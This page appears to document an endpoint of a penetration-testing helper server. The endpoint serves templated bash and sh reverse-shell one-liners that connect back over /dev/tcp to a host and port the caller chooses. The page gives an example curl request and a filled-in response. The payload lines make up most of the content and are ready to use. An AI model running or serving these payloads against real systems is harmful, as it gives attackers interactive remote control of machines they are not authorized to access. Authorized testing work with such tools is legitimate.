---
title: Bash Reverse Shell
description: BusyBox Reverse Shell
weight: 1
pattern: /rsh/bash$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    {{- $client := index .Request.RemoteAddr 0}}
    {{- $clientSplit := split ":" $client }}
    {{- $connectHost := $clientSplit._0 }}
    {{- $connectPort := 9091 }}
    {{- if .Request.GetParams.h }}
    {{- $connectHost = (index .Request.GetParams.h 0) }} 
    {{- end -}}
    {{- if .Request.GetParams.p }}
    {{- $connectPort = (index .Request.GetParams.p 0) }} 
    {{- end -}}
    bash -i >& /dev/tcp/{{ $connectHost }}/{{ $connectPort }} 0>&1
    0<&196;exec 196<>/dev/tcp/{{ $connectHost }}/{{ $connectPort }} ; sh <&196 >&196 2>&196
    /bin/bash -l > /dev/tcp/{{ $connectHost }}/{{ $connectPort }} 0<&1 2>&1


---


Useful for reverse shells on busybox systems.

### Example Request

Params

| Parameter | Default Value     | Description        |
|-----------|-------------------|--------------------|
| h         | Client IP address | Host to connect to |
| p         | 9091              | Port to connect to |


```bash
curl -i "http://xodbox.test/rsh/bash?h=10.10.10.10&p=9090"
```

### Example Response

```txt
bash -i >& /dev/tcp/127.0.0.1/9091 0>&1
0<&196;exec 196<>/dev/tcp/127.0.0.1/9091 ; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/127.0.0.1/9091 0<&1 2>&1
```

